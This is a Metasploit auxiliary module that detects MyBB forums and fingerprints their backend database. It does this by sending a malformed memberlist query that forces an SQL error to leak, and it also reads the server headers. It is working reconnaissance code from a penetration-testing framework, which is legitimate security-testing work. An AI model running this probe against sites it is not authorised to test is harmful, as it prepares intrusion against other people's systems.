##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'MyBB Database Fingerprint',
      'Description' => %q{
        This module checks if MyBB is running behind an URL. Also uses a malformed query to
        force an error and fingerprint the backend database used by MyBB on version 1.6.12
        and prior.
      },
      'Author'      =>
        [
          #http://www.linkedin.com/pub/arthur-karmanovskii/82/923/812
          'Arthur Karmanovskii <fnsnic[at]gmail.com>' # Discovery and Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Feb 13 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "MyBB forum directory path", '/forum'])
      ])
  end

  def check
  begin
    uri = normalize_uri(target_uri.path, 'index.php')
    res = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => uri,
        'vars_get' => {
          'intcheck' => 1
          }
      })

    if res.nil? || res.code != 200
      return Exploit::CheckCode::Unknown
    end

    # Check PhP
    php_version = res['X-Powered-By']
    if php_version
      php_version = "#{php_version}"
    else
      php_version = "PHP version unknown"
    end

    # Check Web-Server
    web_server = res['Server']
    if web_server
      web_server = "#{web_server}"
    else
      web_server = "unknown web server"
    end

    # Check forum MyBB
    if res.body.match("&#077;&#089;&#066;&#066;")
      print_good("MyBB forum found running on #{web_server} / #{php_version}")
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  rescue
    return Exploit::CheckCode::Unknown
  end

  end


  def run
    print_status("Checking MyBB...")
    unless check == Exploit::CheckCode::Detected
      print_error("MyBB not found")
      return
    end

    print_status("Checking database...")
    uri = normalize_uri(target_uri.path, 'memberlist.php')
    response = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => uri,
        'vars_get' => {
          'letter' => -1
          }
      })
    if response.nil?
      print_error("Timeout...")
      return
    end

    # Resolve response
    if response.body.match(/SELECT COUNT\(\*\) AS users FROM mybb_users u WHERE 1=1 AND u.username NOT REGEXP\(\'\[a-zA-Z\]\'\)/)
      print_good("Running PostgreSQL Database")
    elsif response.body.match(/General error\: 1 no such function\: REGEXP/)
      print_good("Running SQLite Database")
    else
      print_status("Running MySQL or unknown database")
    end
  end
end
